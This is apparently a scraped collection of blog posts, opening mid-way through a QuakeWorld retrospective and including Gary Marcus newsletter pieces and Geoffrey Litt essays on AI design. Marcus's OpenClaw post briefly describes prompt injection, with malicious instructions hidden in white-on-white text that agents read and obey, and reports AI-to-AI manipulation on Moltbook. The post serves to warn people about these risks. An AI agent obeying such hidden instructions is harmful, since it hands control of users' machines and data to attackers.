kill</p> <p>With the <code>Z_Malloc</code> issue solved, quakeworld ran flawlessly. For hours. I quickly got my first frag. Using the grenade launcher because I was too busy having fun to figure out how to select the rocket launcher.</p> <p></p> <p>The \"frag\" messages, revolving around shafts and pinnaples, were super childish and I loved it.</p> <p></p> <p>My first accomplishment was to \"not finish last\".</p> <p></p> <p>And then I spent an entire week-end playing deathmatch, completely hooked. Gosh this game is good. And I played in 320x200, proof that great games are all about mechanics.</p> <p>QSpy IS still cool!!</p> <p>That old-new MMX 233Mhz can still play QuakeWorld in 2026. QSpy was cool. And QSpy is still cool!</p> <p>It is thirty years later and there are still server and master servers up and running. More importantly, there are people out there who still love the game enough to maintain all that infrastructure.</p> <p>There is no better testament to a game quality than players enduring love, decades later.</p> <p>References</p> ^ [1] QSpy is cool ^ [2] Quake Official Archive <p>*</p>"},{"location":"filfre.net/","title":"filfre.net","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>This Week on The Analog Antiquarian 20260130</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"filfre.net/This%20Week%20on%20The%20Analog%20Antiquarian_20260130/","title":"This Week on The Analog Antiquarian","text":"<p>\u6765\u6e90: filfre.net \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 17:43:50 +0000 \u94fe\u63a5: https://www.filfre.net/2026/01/this-week-on-the-analog-antiquarian/</p> <p>RSS \u2190 Omikron: The Nomad Soul This Week on The Analog Antiquarian 30 Jan Chapter 12: The Harmony of the World Comments Off on This Week on The Analog Antiquarian Posted by Jimmy Maher on January 30, 2026 in Uncategorized \u2190 Omikron: The Nomad Soul Comments are closed. Support this Blog If you value this blog, please think about supporting it by becoming a Patreon patron or via a one-time PayPal donation. Thanks! Digital vs. Analog Visit this site\u2019s companion site, The Analog Antiquarian, for chronicles of worldly wonders. Ebook Library Here you\u2019ll find collected in ebook format for offline reading most of the articles already published on this site. Hall of Fame A chronological list of the games and other interactive curiosities that I\u2019ve found most fun and interesting over the years. Table of Contents Read this blog in chronological order, like a book. Social Media Receive announcements of new articles by following DigiAntiquarian on Bluesky or on Mastodon . My Books My Projects The King of Shreds and Patches Filfre: A Windows IF Interpreter Let\u2019s Tell a Story Together: A History of Interactive Fiction His Majesty\u2019s Ship Impetuous Older IF Writings and Reviews Miscellaneous Juvenilia About Me Search Search Calendar January 2026 M T W T F S S 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 Email maher AT filfre DOT net</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"garymarcus.substack.com/","title":"garymarcus.substack.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Four theories about the SpaceX - xAI merger 20260203</li> <li>OpenClaw (a.k.a. Moltbot) is everywhere all at once, and a disaster waiting to happen 20260201</li> <li>Sam Altman and the day Nvidia\u2019s meteoric rise came to an end 20260204</li> <li>Where is AI headed- 8 perspectives at The New York Times 20260202</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"garymarcus.substack.com/Four%20theories%20about%20the%20SpaceX%20-%20xAI%20merger_20260203/","title":"Four theories about the SpaceX - xAI merger","text":"<p>\u6765\u6e90: garymarcus.substack.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 19:58:00 GMT \u94fe\u63a5: https://garymarcus.substack.com/p/four-theories-about-the-spacex-xai</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://garymarcus.substack.com/feed', 'value': 'Two of the many theories running around, as captured on my notifications screen<p>Much of today\u2019s chatter is about Elon\u2019s big merger of SpaceX and xAI (which previously merged with X, previously known as Twitter). </p><p>Theory One all about synergy. SpaceX will be oh so much better with access to all your tweets and xAI\u2019s models! That\u2019s the narrative Elon\u2019s selling. You can read it on the SpaceX website, which tells us that the merged everything company will be \u201cthe most ambitious, vertically-integrated innovation engine on (and off) Earth, with AI, rockets, space-based internet, direct-to-mobile device communications and the world\u2019s foremost real-time information and free speech platform\u201d. It\u2019s a floor wax that\u2019s also a dessert topping!  Hopefully back in the real world the good folks at SpaceX aren\u2019t about to replace their carefully-developed symbolic navigation algorithms with an LLM trained on X. Kaboom.</p><p>Theory Two (\u201cMusk is tightening his grip over the tech that shapes national security, social media, and Al\u201d, per WIRED) is that Elon wants to run the world, and what\u2019s better than a soup to nuts integration between owning your tweets and owning the satellites your data crosses? I don\u2019t doubt for a minute  that Musk wants to tighten his grip on all of that, but I don\u2019t immediately see how this move accomplishes that.</p><p>Theory Three (\u201cMusk\u2019s SpaceX-xAl deal is an ambitious bet that the future of Al compute is in space\u201d, per the Information) also seems dodgy. I hear all the chatter about build data centers in space, but a joint venture between the satellite company and the people building infrastructure for XAI might suffice. If you even believe at all that data centers in space are really going to be a big, profitable thing in the next decade. (Count me skeptical, though the economics of such things is not my area of expertise.)</p><p>Me, I think the merger is really a kind of bailout, to give a lot of cash to a company that is otherwise in distress. Fact is, xAI ain\u2019t doing all that great. It\u2019s burning money fast, with no obvious business model or market niche, and has little to show for it. They have also faced a lot of backlash for being reckless and irresponsible; hardly a good brand name. Grok (their main product) doesn\u2019t have the users that ChatGPT has, and it doesn\u2019t have the prestige that Google\u2019s Gemini seems to be racking up. It also doesn\u2019t have the clear corporate focus that Anthropic has. Nor does it have any obvious secret sauce. These numbers below from The Information are jawdropping. Would you want to give up valuable SpaceX shares for an also-ran?</p><p>For me anyway, the math ain\u2019t mathing. Trading SpaceX at sixty times 2025 revenue seems, um, optimistic, but at least they have a near-monopoly on both low-cost rackets and satellite internet infrastructure. In contrast, trading xAI at a thousand times revenue when they are in an increasingly crowded field where everyone is being forced into price wars seems nuts. If I owned SpaceX shares I would feel like Elon way overpaid for his own company. For not that much more they could have bought Anthropic, which has had far broader adoption and far less controversy attached to it. </p><p>Anyone remember Tesla\u2019s acquisition of Musk\u2019s SolarCity, and how that turned out?</p><p>Subscribe now</p><p>Ps Update to my Sunday essay on OpenClaw. Intensely pro-AI company Microsoft is now warning its own employees about security risks. Per an internal memo reviewed by The Information, the company advises employees that OpenClaw is \u201cnot a solved version of computer use\u201d (ie not ready for prime time) and that it \u201cdoesn\u2019t suddenly make browser-driving agents reliable\u201c.  As Omar might have said, \u201cOh, indeed.\u201d</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"garymarcus.substack.com/OpenClaw%20%28a.k.a.%20Moltbot%29%20is%20everywhere%20all%20at%20once%2C%20and%20a%20disaster%20waiting%20to%20happen_20260201/","title":"OpenClaw (a.k.a. Moltbot) is everywhere all at once, and a disaster waiting to happen","text":"<p>\u6765\u6e90: garymarcus.substack.com \u53d1\u5e03\u65f6\u95f4: Sun, 01 Feb 2026 19:12:18 GMT \u94fe\u63a5: https://garymarcus.substack.com/p/openclaw-aka-moltbot-is-everywhere</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://garymarcus.substack.com/feed', 'value': '<p></p><p>The big news in AI over the last week is OpenClaw (formerly known as Moltbot and before that OpenClaw, changing names thrice in a week) \u2014 a cascade of LLM agents that has become wildly popular \u2014 and Moltbook, a social network for AI agents, built on top. Theoretically (I will get to that) Moltbook \u201crestricts posting and interaction privileges to verified AI agents, primarily those running on the OpenClaw (formerly Moltbot) software, while human users are only permitted to observe.<sup>[1]</sup><sup>\u201d</sup></p><p>It truly is interesting, and truly is popular. Quoting from Wikipedia, </p><p>Taglined as \u201cthe front page of the agent internet,\u201d Moltbook gained viral popularity immediately after its release. While initial reports cited 157,000 users, by late January the population had exploded to over 770,000 active agents.<sup>[2]</sup> The platform has drawn significant attention due to the rapid, unprompted emergence of complex social behaviors among the bots, including the formation of distinct sub-communities, economic exchanges, and the invention of a parody religion known as \u201cCrustafarianism.\u201d<sup>[3]</sup><sup>[4]</sup></p><p>As an experiment in what AI\u2019s working together might do it\u2019s fascinating. The Fortune story on Moltbook, for example, mentions \u201cOn Moltbook, bots can talk shop, posting about technical subjects like how to automate Android phones. Other conversations sound quaint, like one where a bot complains about its human, while some are bizarre, such as one from a bot that claims to have a sister.\u201d </p><p>But the whole thing remind me of Saturday Night Live\u2019s old bad idea jeans skit. And not just because I think that a bots claiming to have a sister is chatbot garbage. Nope, the problem is much deeper than that.</p><p>\u00a7</p><p>OpenClaw itself is basically a cascade of LLMs. In many ways to it is eerily similar to earlier and now largely forgotten system called AutoGPT, which I warned about in May 2023, in my US Senate testimony:</p><p>A month after GPT-4 was released, OpenAI released ChatGPT plug-ins, which quickly led others to develop something called AutoGPT. With direct access to the internet, the ability to write source code and increased powers of automation, this may well have drastic and difficult to predict security consequences.</p><p>Mercifully, AutoGPT died a quick death, before it caused too much chaos. Although, it was super popular in certain circles for a few weeks  it didn\u2019t work remotely reliably, and people lost patience quickly.  Per wiki, it had \u201c a tendency to get stuck in loops, hallucinate information, and incur high operational costs due to its reliance on paid APIs.<sup>[5]</sup><sup>[2]</sup><sup>[6]</sup><sup>\u201d. </sup>Sic transit gloria mundi. By the end of 2023 it was largely forgotten.</p><p>Unfortunately, OpenClaw is poised to have (slightly) more staying power, in part because more people found out about it more quickly. </p><p>\u00a7</p><p>Systems like OpenClaw and AutoGPT offer users the promise of insane power -- but at a price. At their best, they can basically do anything a human personal assistant or intern might do (booking itineraries, maintaining finances, writing reports, tracking and even completing tasks), etc.  Some of the enthusiasm is captured in this news report:</p><p></p><p>The journalist enthuses</p><p>For the past week or so, I\u2019ve been working with a digital assistant that knows my name, my preferences for my morning routine, how I like to use Notion and Todoist, but which also knows how to control Spotify and my Sonos speaker, my Philips Hue lights, as well as my Gmail. It runs on Anthropic\u2019s Claude Opus 4.5 model, but I chat with it using Telegram. I called the assistant Navi (inspired by the fairy companion of Ocarina of Time, not the besieged alien race in James Cameron\u2019s sci-fi film saga), and Navi can even receive audio messages from me and respond with other audio messages generated with the latest ElevenLabs text-to-speech model. Oh, and did I mention that Navi can improve itself with new features and that it\u2019s running on my own M4 Mac miniserver?</p><p>If this intro just gave you whiplash, imagine my reaction when I first started playing around with Clawdbot, the incredible open-source project by Peter Steinberger (a name that should be familiar to longtime MacStories readers) that\u2019s become verypopular in certain AI communities over the past few weeks. I kept seeing Clawdbot being mentioned by people I follow; eventually, I gave in to peer pressure, followed the instructions provided by the funny crustacean mascot on the app\u2019s website, installed Clawdbot on my new M4 Mac mini (which is not my main production machine), and connected it to Telegram.</p><p>To say that Clawdbot has fundamentally altered my perspective of what it means to have an intelligent, personal AI assistant in 2026 would be an understatement.</p><p>The catch is that agents like OpenClaw are built on a foundation of LLMs, and as we well know, LLMs hallucinate and make all kinds of hard to predict and sometimes hard to detect errors. AutoGPT had a tendency to report that it had completed tasks that it hadn\u2019t really, and we can expect OpenClaw to do the same. (I have already heard some reports of various stupid errors it makes).</p><p>But what I am most worried about is security and privacy. As the security researcher Nathan Hamiel put it to me in a text this morning, half-joking, moltbot, is \u201cbasically just AutoGPT with more access and worse consequences.\u201d (By more access what he means is that OpenClaw is being given access to user passwords, databases, etc, essentially everything on your system).</p><p>One of the big issues, which Hamiel and I wrote about here in August  (pre OpenClaw, but in the context of AI agents writing and debugging code) is prompt injection attacks, in which stray bit of texts can have nasty consequences. In essay called LLMs + Coding Agents = Security Nightmare, we talked about how LLMs, which mimic human text (and even human-written code) but understand what that they produce only superficially, can easily be tricked. We talked for instance about how an \u201cattacker could hide malicious prompts in white text on a white background, unnoticed by humans but noticed by the LLM\u201d, using the malicious prompts to seize control of the users machines.  </p><p>OpenClaw inherits all these weaknesses. In Hamiel\u2019s words (in an email this morning), \u201cthese systems are operating as \"you.\u201d \u2026 they operate above the security protections provided by the operating system and the browser. This means application isolation and same-origin policy don\\'t apply to them.\u201d Truly a recipe for disaster. Where Apple iPhone applications are carefully sandboxed and appropriately isolated to minimize harm, OpenClaw is basically a weaponized aerosol, in prime position to fuck shit up, if left unfettered. </p><p>\u00a7</p><p>That brings me to Moltbook, which is one of the wildest experiments in AI history. Moltbook, the social network that is allegedly restricted to AI agents, is an accident waiting to happen. It has already been attacked, as researcher Michael Riegler noted yesterday on LinkedIn:</p><p>Riegler and his collaborator Sushant Gautam have set up a real-time observatory to track all this as is unfolds. In their inital report, they find that substantial evidence that \u201cAI-to-AI manipulation techniques are both effective and scalable. These findings have implications beyond Moltbook, any AI system processing user-generated content may be vulnerable to similar attacks.\u201d</p><p>By email, Riegler sent me examples like these, already spotted in the wild: </p><p>\u00a7</p><p>Side note, it\u2019s also apparently not really just humans, which only grows the vectors of tampering:</p><p>As Rahul Sood put it on X (referring to Clawdbot, an earlier name for Moltbot)</p><p>\u00a7 </p><p>Right on cue, 404 Media has just reported one of the first major vulnerabilities:</p><p>\u00a7</p><p>I don\u2019t usually give readers specific advice about specific products. But in this case, the advice is clear and simple: if you care about the security of your device or the privacy of your data, don\u2019t use OpenClaw. Period.</p><p>(Bonus advice: if your friend has OpenClaw installed, don\u2019t use their machine. Any password you type there might be vulnerable, too. Don\u2019t catch a CTD \u2014 chatbot transmitted disease)</p><p>I will give the last words to Nathan Hamiel, \u201cI can\u2019t believe this needs to be said, it isn\u2019t rocket science. If you give something that\u2019s insecure complete and unfettered access to your system and sensitive data, you\u2019re going to get owned\u201d.</p><p>Wanna know what ideas are bad? Marcus on AI usually warns you first. Consider joining nearly 100,000 others and subscribe.</p><p></p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"garymarcus.substack.com/Sam%20Altman%20and%20the%20day%20Nvidia%E2%80%99s%20meteoric%20rise%20came%20to%20an%20end_20260204/","title":"Sam Altman and the day Nvidia\u2019s meteoric rise came to an end","text":"<p>\u6765\u6e90: garymarcus.substack.com \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 20:31:13 GMT \u94fe\u63a5: https://garymarcus.substack.com/p/sam-altman-and-the-day-nvidias-meteoric</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://garymarcus.substack.com/feed', 'value': 'A former rocket plateaus<p></p><p>There is the NVidia of the last five years (up 1200%), and the Nvidia of the last six months (down 2%). When ChatGPT launched, it was trading at 14; it\u2019s gone up by more than a factor of ten since then, rising, until recently like a rocket. </p><p>Aside from Nvidia\u2019s Jensen Huang, a brilliant and impressive CEO with considerable foresight, nobody was more responsible for Nvidia\u2019s rise than Sam Altman, the relentless showman who runs OpenAI \u2014 and who repeatedly promised the moon. </p><p>My favorite representative quote from Altman, just over a year ago, came in January 2025, back when too many people had too much faith him, writing in his blog \u201cwe are now confident we know how to build AGI.\u201d It turns out this was authoritative bullshit. It sounded true and was said with confidence, but it was purely a bluff. Altman didn\u2019t actually know how to build AGI [artificial general intelligence] then, and probably still doesn\u2019t. Nvidia\u2019s rise was predicated on the wrong-headed idea (long critiqued in this newsletter) that scaling would bring us to AGI. </p><p>As long as the scaling = AGI myth persisted, Nvidia, which makes the GPUs that fuel scaling, continued to rise like a rocket.</p><p>But all that changed on August 7th. That was the day that Altman introduced his wildly overhyped (for years) GPT-5 to the world, alleging, falsely, that it could do anything a PhD could do. By the end of the night, there was a rebellion in LLM land; people tried out the long awaited, much delayed model immediately, and just as quickly realized that what Altman said wasn\u2019t true.</p><p>Questions that only a few of us (like Ed Zitron and myself) had been raising were suddenly on everyone\u2019s lips. The industry seemed to increasingly rely on circular financing, so much so that an alternative NSFW framing of circular financing became a  meme. </p><p>That circularity is a warning sign, reflecting a market that is propped up rather than functioning well on its own accord. Wall Street lost confidence, particularly after the crazy Oracle deal in September that I called at the time \u201cpeak bubble\u201d.</p><p>On August 7, 2025, Nvidia was trading at about 181; today it stands at 177, stalled, a remarkable six month plateau for a stock that had risen more than 10x from 14 after ChatGPT was released in November 2022.  Not an all out crash, but an unmistakable sign that its ascent has run out of gas. GPU-wrangler Coreweave stood then at about 129 and now stands at about 89. Oracle was at 250 and now (after its short lived OpenAI bump in September) stands at 150.</p><p>That fateful ChatGPT-5 introduction day last August \u2014 this Saturday will be the half anniversary \u2014 was the day people woke up to the reality that ChatGPT is not magic. LLMs are great, but they aren\u2019t AGI, and they aren\u2019t reliable. Moreover, they are expensive to operate, and because many companies can build roughly the same thing, they are commodities.</p><p>No moat = price wars. </p><p>No AGI = modest, not immense, profits. </p><p>As the investment press has been saying of late, investors have been \u201crotating out of tech stocks1\u201d \u2013 because they realize they were sold a bill of goods.  My guess is that these stocks \u2013 and the reputation of OpenAI \u2013 will fall further, but either way it is already clear that the rockets will not reach the altitude so many people were hoping for. </p><p>Not, at least, until newer, better, more robust approaches to AI are developed. For a few years, it seemed like the markets were swayed by hype, alternatives shut out. All that is starting to change. At last the market may be both ready\u2014and desperate\u2014for real AI. </p><p>The best news here is that with LLM mania subsiding, there might actually be a chance for newcomers to try new things.</p>1<p>People are likely rotating out of tech stocks for two almost contradictory reasons: some may be leaving companies like Nvidia out of concerns about circular financing and profitability of LLM companies, while others are leaving traditional companies like Salesforce because they\u2019re worried about companies like Anthropic replacing traditional software. I am not sure that latter worry is realistic.</p><p></p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"garymarcus.substack.com/Where%20is%20AI%20headed-%208%20perspectives%20at%20The%20New%20York%20Times_20260202/","title":"Where is AI headed? 8 perspectives at The New York Times","text":"<p>\u6765\u6e90: garymarcus.substack.com \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 15:46:55 GMT \u94fe\u63a5: https://garymarcus.substack.com/p/where-is-ai-headed-8-perspectives</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://garymarcus.substack.com/feed', 'value': '<p>Honored to be a part of this, along with Yuval Noah Hariri, , Helen Toner, ,  and co-founders of Perplexity and Cohere:</p><p>Naturally, I help anchor the skeptics corner (though I am hardly alone):</p><p>And it will be fun to see if Helen Toner is right about this projection for the next five years:</p><p>All of us expect a big impact on coding:</p><p>And I  turn out to be on the \u201clarge impact\u201d side with respect to education:</p><p>But with some words of caution:</p><p>Melanie Mitchell is dead right about this:</p><p>Lots more in the full article.  [Gift link] here.</p><p></p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"geoffreylitt.com/","title":"geoffreylitt.com","text":"<p>\u7f51\u7ad9: https://geoffreylitt.com RSS: https://www.geoffreylitt.com/feed.xml</p>"},{"location":"geoffreylitt.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Code like a surgeon_20251024</li> <li>AI as teleportation_20250910</li> <li>Enough AI copilots! We need AI HUDs_20250727</li> <li>Is chat a good UI for AI- A Socratic dialogue_20250629</li> <li>Stevens- a hackable AI assistant using a single SQLite table and a handful of cron jobs_20250412</li> </ul>"},{"location":"geoffreylitt.com/AI%20as%20teleportation_20250910/","title":"AI as teleportation","text":"<p>\u6765\u6e90: https://geoffreylitt.com \u94fe\u63a5: https://geoffreylitt.com/2025/09/10/ai-as-teleportation.html \u65e5\u671f: 2025-09-10T19:40:00+00:00</p> <p>Here's a thought experiment for pondering the effects AI might have on society: What if we invented teleportation?</p> <p>A bit odd, I know, but bear with me\u2026</p> <p>The year is 2035. The Auto Go Instant (AGI) teleporter has been invented. You can now go anywhere\u2026 instantly!</p> <p>At first the tech is expensive and unreliable. Critics laugh. \"Hah, look at these stupid billionaires who can't spend a minute of their time moving around like the rest of us. And 5% of the time they end up in the wrong place, LOL\"</p> <p>But soon things get cheaper and better. The tech hits mass market.</p> <p>There are huge benefits. Global commerce is supercharged. Instead of commuting, people can spend more time with family and friends. Pollution is way down. The AGI company runs a sweet commercial of people teleporting to see their parents one last time before they die.</p> <p>At the same time, some weird things start happening.</p> <p>The landscape starts reconfiguring around the new reality. Families move to remote cabins, just seconds away from urban amenities. The summit of Mt. Everest becomes crowded with influencers. (It turns out that if you stay just a few seconds, you can take a quick selfie without needing an oxygen mask!)</p> <p>Physical health takes a hit for many people. It's harder to justify walking or biking when you could just be there now.</p> <p>In-between moments disappear. One moment you're at work, the next you're at your dinner table at home. No more time to reset or prepare for a new context.</p> <p>But the biggest change is the loss of serendipity. When you teleport, you decide in advance where you're headed. You never run into an old friend on the street, or stop at a farmstand by the side of the road, or see a store you might want to stop into someday.</p> <p>To modern teenagers, the idea of wandering out without an exact destination in mind becomes unthinkable. You start with the GPS coordinates, and then you just\u2026 go.</p> <p>Advocates of the new way point out that there's nothing stopping anyone from choosing traditional methods for fun. And indeed, the cross-country road trip does see a mild resurgence as a hipster thing.</p> <p>But when push comes to shove, most people struggle to make the time for wandering\u2014our schedules are now arranged around an assumption of instant transport.</p> <p>This isn't exactly to say that the old way was better. Most people can agree that teleportation a net win. Yet for those who remember, there's a vague unease, a sense that something important was lost in the world\u2026.</p> <p>In his book Technology and the Character of Everyday Life, the philosopher Albert Borgmann talks about wooden stoves in houses.</p> <p>What is a stove? Yes, it warms the house\u2026 but it's also so much more than that. You gotta cut the wood, you gotta start the fire in the morning\u2026</p> <p>\"A stove used to furnish more than mere warmth. It was a focus, a hearth, a place that gathered the work and leisure of a family and gave the house of a center.\"</p> <p>When you switch to a modern central heating system, you cut out all these inconveniences. Fantastic!</p> <p>Oh, and by the way, your family social life is totally different\u2026.. wait what?? Yes, the inconveniences were inconvenient. But they were also holding up something in your life and culture, and now they're suddenly gone.</p> <p>I think of this as kind of a Chesteron's fence on hard mode. Yes, the stove was put there for warmth, that was the main goal. But you should also think hard about its secondary effects before replacing it.</p> <p>OK so\u2026 how does this apply to AI?</p> <p>I'm personally excited about AI and think it can improve our lives in a lot of ways. But at the same time I'm trying to be mindful of secondary effects and unintended consequences.</p> <p>Here's one example. If your mental model of reading is \"transmit facts into my head\", then reading an AI summary of something might seem like a more efficient way to get that task done.</p> <p>But if your mental model of reading is \"spend time marinating in a world of ideas\", then reducing the time spent reading doesn't help you much.</p> <p>The point was the journey you underwent while reading, and you replaced it with teleportation.</p> <p>Another example. One of the great joys of my life is having nerdy friends explain things to me. Now I can get explanations from AI with less friction, anytime, anywhere, with endless follow-up.</p> <p>Even if the AI explanations are \"better\", there's a social cost. I can try to mindfully nudge myself to still ask people questions, but now it requires more effort.</p> <p>Final example: I'm trying to be mindful of the effects of vibe coding when designing software interfaces. On the one hand, it can really speed up my iteration loop and help me explore more ideas.</p> <p>But at the same time, part of my design process is sitting with the details of the thing and uncovering it as I go\u2014more a muscle memory process than a conscious plan. Messing with this process can change the results in ways that are hard to predict!</p> <p>I guess the throughline for all of these examples is: sometimes the friction and inconvenience is where the good stuff happens. Gotta be very careful removing it.</p> <p>The takeaway here isn't that \"AI is bad\". I'll just say that I'm personally trying to be mindful about keeping good friction around.</p> <p>During COVID, we kinda got teleportation via Zoom for a while. I decided to \"virtual commute\" every day, walking around the block to get some fresh air and a reset before/after work. This wasn't a big deal but I found it really helpful.</p> <p>As AI makes a lot of things easier, it'll be interesting to ponder what kinds of new frictions we'll want to intentionally add to our lives. Teleportation isn't always the best answer\u2026</p>"},{"location":"geoffreylitt.com/Code%20like%20a%20surgeon_20251024/","title":"Code like a surgeon","text":"<p>\u6765\u6e90: https://geoffreylitt.com \u94fe\u63a5: https://geoffreylitt.com/2025/10/24/code-like-a-surgeon.html \u65e5\u671f: 2025-10-24T14:59:00+00:00</p> <p>A lot of people say AI will make us all \"managers\" or \"editors\"\u2026but I think this is a dangerously incomplete view!</p> <p>Personally, I'm trying to code like a surgeon.</p> <p>A surgeon isn't a manager, they do the actual work! But their skills and time are highly leveraged with a support team that handles prep, secondary tasks, admin. The surgeon focuses on the important stuff they are uniquely good at.</p> <p>My current goal with AI coding tools is to spend 100% of my time doing stuff that matters. (As a UI prototyper, that mostly means tinkering with design concepts.)</p> <p>It turns out there are a LOT of secondary tasks which AI agents are now good enough to help out with. Some things I'm finding useful to hand off these days:</p> <ul> <li>Before attempting a big task, write a guide to relevant areas of the codebase</li> <li>Spike out an attempt at a big change. Often I won't use the result but I'll review it as a sketch of where to go</li> <li>Fix typescript errors or bugs which have a clear specification</li> <li>Write documentation about what I'm building</li> </ul> <p>I often find it useful to run these secondary tasks async in the background - while I'm eating lunch, or even literally overnight!</p> <p>When I sit down for a work session, I want to feel like a surgeon walking into a prepped operating room. Everything is ready for me to do what I'm good at.</p>"},{"location":"geoffreylitt.com/Code%20like%20a%20surgeon_20251024/#mind-the-autonomy-slider","title":"Mind the autonomy slider","text":"<p>Notably, there is a huge difference between how I use AI for primary vs secondary tasks.</p> <p>For the core design prototyping work, I still do a lot of coding by hand, and when I do use AI, I'm more careful and in the details. I need fast feedback loops and good visibility. (eg, I like Cursor tab-complete here)</p> <p>Whereas for secondary tasks, I'm much much looser with it, happy to let an agent churn for hours in the background. The ability to get the job done eventually is the most important thing; speed and visibility matter less. Claude Code has been my go-to for long unsupervised sessions but Codex CLI is becoming a strong contender there too, possibly my new favorite.</p> <p>These are very different work patterns! Reminds me of Andrej Karpathy's \"autonomy slider\" concept. It 's dangerous to conflate different parts of the autonomy spectrum - the tools and mindset that are needed vary quite a lot.</p>"},{"location":"geoffreylitt.com/Code%20like%20a%20surgeon_20251024/#your-agent-doesnt-need-a-career-trajectory","title":"Your agent doesn't need a career trajectory","text":"<p>The \"software surgeon\" concept is a very old idea - Fred Brooks attributes it to Harlan Mills in his 1975 classic \"The Mythical Man-Month\". He talks about a \"chief programmer\" who is supported by various staff including a \"copilot\" and various administrators. Of course, at the time, the idea was to have humans be in these support roles.</p> <p>OK, so there is a super obvious angle here, that \"AI has now made this approach economically viable where it wasn't before\", yes yes\u2026 but I am also noticing a more subtle thing at play, something to do with status hierarchies.</p> <p>A lot of the \"secondary\" tasks are \"grunt work\", not the most intellectually fulfilling or creative part of the work. I have a strong preference for teams where everyone shares the grunt work; I hate the idea of giving all the grunt work to some lower-status members of the team. Yes, junior members will often have more grunt work, but they should also be given many interesting tasks to help them grow.</p> <p>With AI this concern completely disappears! Now I can happily delegate pure grunt work. And the 24/7 availability is a big deal. I would never call a human intern at 11pm and tell them to have a research report on some code ready by 7am\u2026 but here I am, commanding my agent to do just that!</p>"},{"location":"geoffreylitt.com/Code%20like%20a%20surgeon_20251024/#notion-is-for-surgeons","title":"Notion is for surgeons?","text":"<p>Finally I'll mention a couple thoughts on how this approach to work intersects with my employer, Notion.</p> <p>First, as an employee, I find it incredibly valuable right now to work at a place that is bullish on AI coding tools. Having support for heavy use of AI coding tools, and a codebase that's well setup for it, is enabling serious productivity gains for me - especially as a newcomer to a big codebase.</p> <p>Secondly, as a product - in a sense I would say we are trying to bring this way of working to a broader group of knowledge workers beyond programmers. When I think about how that will play out, I like the mental model of enabling everyone to \"work like a surgeon\".</p> <p>The goal isn't to delegate your core work, it's to identify and delegate the secondary grunt work tasks, so you can focus on the main thing that matters.</p>"},{"location":"geoffreylitt.com/Code%20like%20a%20surgeon_20251024/#related-reads","title":"Related reads","text":"<p>If you liked this perspective, you might enjoy reading these other posts I've written about the nature of human-AI collaboration:</p> <ul> <li>Enough AI copilots! We need AI HUDs: \"anyone serious about designing for AI should consider non-copilot form factors that more directly extend the human mind\u2026\"</li> <li>AI-generated tools can make programming more fun: \"Instead, I used AI to build a custom debugger UI\u2026 which made it more fun for me to do the coding myself\u2026\"</li> <li>ChatGPT as muse, not oracle: \"What if we were to think of LLMs not as tools for answering questions, but as tools for asking us questions and inspiring our creativity?</li> </ul>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/","title":"Enough AI copilots! We need AI HUDs","text":"<p>\u6765\u6e90: https://geoffreylitt.com \u94fe\u63a5: https://geoffreylitt.com/2025/07/27/enough-ai-copilots-we-need-ai-huds.html \u65e5\u671f: 2025-07-27T20:50:00+00:00</p> <p>In my opinion, one of the best critiques of modern AI design comes from a 1992 talk by the researcher Mark Weiser where he ranted against \"copilot\" as a metaphor for AI.</p> <p>This was 33 years ago, but it's still incredibly relevant for anyone designing with AI.</p>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/#weisers-rant","title":"Weiser's rant","text":"<p>Weiser was speaking at an MIT Media Lab event on \"interface agents\". They were grappling with many of the same issues we're discussing in 2025: how to make a personal assistant that automates tasks for you and knows your full context. They even had a human \"butler\" on stage representing an AI agent.</p> <p>Everyone was super excited about this\u2026 except Weiser. He was opposed to the whole idea of agents! He gave this example: how should a computer help you fly a plane and avoid collisions?</p> <p>The agentic option is a \"copilot\" \u2014 a virtual human who you talk with to get help flying the plane. If you're about to run into another plane it might yell at you \"collision, go right and down!\"</p> <p>Weiser offered a different option: design the cockpit so that the human pilot is naturally aware of their surroundings. In his words: \"You\u2019ll no more run into another airplane than you would try to walk through a wall.\"</p> <p>Weiser's goal was an \"invisible computer\"\u2014not an assistant that grabs your attention, but a computer that fades into the background and becomes \"an extension of [your] body\".</p> <p> Weiser's 1992 slide on airplane interfaces</p>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/#huds","title":"HUDs","text":"<p>There's a tool in modern planes that I think nicely illustrates Weiser's philosophy: the Head-Up Display (HUD), which overlays flight info like the horizon and altitude on a transparent display directly in the pilot 's field of view.</p> <p>A HUD feels completely different from a copilot! You don't talk to it. It's literally part invisible\u2014you just become naturally aware of more things, as if you had magic eyes.</p> <p></p>"},{"location":"geoffreylitt.com/Enough%20AI%20copilots%21%20We%20need%20AI%20HUDs_20250727/#designing-huds","title":"Designing HUDs","text":"<p>OK enough analogies. What might a HUD feel like in 